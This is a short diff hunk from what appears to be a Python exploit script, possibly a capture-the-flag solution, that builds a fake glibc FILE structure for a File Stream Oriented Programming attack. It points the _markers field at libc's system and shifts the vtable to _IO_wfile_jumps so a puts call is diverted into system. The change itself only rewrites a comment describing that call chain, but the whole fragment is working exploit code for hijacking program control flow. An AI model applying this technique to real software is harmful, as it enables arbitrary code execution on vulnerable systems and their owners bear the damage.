@@ -84,7 +84,7 @@ FSOP = FSOP_struct(
     _wide_data      = fsop_addr - 0x28,
 
     _markers        = libc_base + libc.symbols['system'],
-    vtable          = _IO_wfile_jumps - 0x20, # _IO_wfile_overflow
+    vtable          = _IO_wfile_jumps - 0x20, # __xsputn -> _IO_wfile_overflow (@ puts+0xC8)
 
     # call __pad5 + 0x68 -> call _markers
     __pad5          = fsop_addr - 0x8
